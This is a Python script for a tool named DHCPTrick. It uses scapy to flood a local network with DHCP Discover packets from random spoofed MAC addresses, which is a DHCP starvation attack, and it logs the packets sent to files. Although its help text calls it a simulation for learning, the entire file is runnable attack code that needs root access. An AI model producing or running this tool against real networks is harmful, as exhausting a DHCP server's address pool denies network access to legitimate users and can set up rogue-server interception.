import argparse
import logging
import sys
import time
import json
import random
from scapy.all import *
import netifaces

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('dhcptrick.log'),
        logging.StreamHandler(sys.stdout)
    ]
)

class DHCPTrick:
    def __init__(self, interface: str, target_ip: str, rate: float, quiet: bool = False):
        self.interface = interface
        self.target_ip = target_ip
        self.rate = max(0.1, rate)
        self.quiet = quiet
        self.running = False
        self.packet_count = 0
        self.results = []
        self.output_file = f"dhcptrick_results_{time.strftime('%Y%m%d_%H%M%S')}.txt"
        self.json_file = f"dhcptrick_results_{time.strftime('%Y%m%d_%H%M%S')}.json"
        conf.iface = interface
        conf.verb = 0

    def get_random_mac(self) -> str:
        """Generate a random MAC address."""
        return ':'.join(['%02x' % random.randint(0, 255) for _ in range(6)])

    def craft_dhcp_discover(self) -> Optional[Packet]:
        """Craft a DHCP Discover packet."""
        try:
            mac = self.get_random_mac()
            pkt = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                   IP(src="0.0.0.0", dst="255.255.255.255") /
                   UDP(sport=68, dport=67) /
                   BOOTP(chaddr=[mac2str(mac)], xid=random.randint(1, 1000000)) /
                   DHCP(options=[("message-type", "discover"), ("end")]))
            return pkt
        except Exception as e:
            logging.error(f"Error crafting DHCP packet: {e}")
            return None

    def send_packet(self):
        """Send a DHCP Discover packet."""
        try:
            pkt = self.craft_dhcp_discover()
            if not pkt:
                return
            sendp(pkt, iface=self.interface, count=1, verbose=0)
            self.packet_count += 1
            result = f"Sent packet #{self.packet_count}: {pkt.summary()}"
            self.results.append(result)
            logging.info(result)
            with open(self.output_file, 'a') as f:
                f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {result}\n")
        except Exception as e:
            logging.error(f"Error sending packet: {e}")

    def run(self):
        """Run DHCP starvation attack."""
        logging.info(f"Starting DHCPTrick on {self.interface}, target: {self.target_ip}, rate: {self.rate}/s")
        json_results = []
        self.running = True
        try:
            while self.running:
                self.send_packet()
                json_results.append({"packet": self.packet_count, "summary": self.results[-1] if self.results else ""})
                time.sleep(1.0 / self.rate)
        except KeyboardInterrupt:
            self.stop(json_results)

    def stop(self, json_results: List[dict]):
        """Stop attack and save results."""
        self.running = False
        logging.info(f"DHCPTrick stopped. Total packets sent: {self.packet_count}")
        with open(self.output_file, 'a') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Total packets sent: {self.packet_count}\n")
        with open(self.json_file, 'w') as f:
            json.dump({"interface": self.interface, "target_ip": self.target_ip,
                       "results": json_results, "total_packets": self.packet_count,
                       "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}, f, indent=4)
        logging.info(f"Results saved to {self.output_file} and {self.json_file}")

def main():
    parser = argparse.ArgumentParser(description="DHCPTrick - Simulate DHCP starvation for learning.")
    parser.add_argument('-i', '--interface', required=True, help='Network interface (e.g., eth0)')
    parser.add_argument('-t', '--target-ip', default='192.168.1.1', help='Target IP (default: 192.168.1.1)')
    parser.add_argument('-r', '--rate', type=float, default=1, help='Packet rate (packets/second, default: 1)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (log to file only)')

    args = parser.parse_args()

    if args.quiet:
        logging.getLogger().handlers = [logging.FileHandler('dhcptrick.log')]

    if os.geteuid() != 0:
        logging.error("Root privileges required. Run with sudo.")
        sys.exit(1)

    trick = DHCPTrick(
        interface=args.interface,
        target_ip=args.target_ip,
        rate=args.rate,
        quiet=args.quiet
    )
    try:
        trick.run()
    except KeyboardInterrupt:
        trick.stop([])

if __name__ == "__main__":
    main()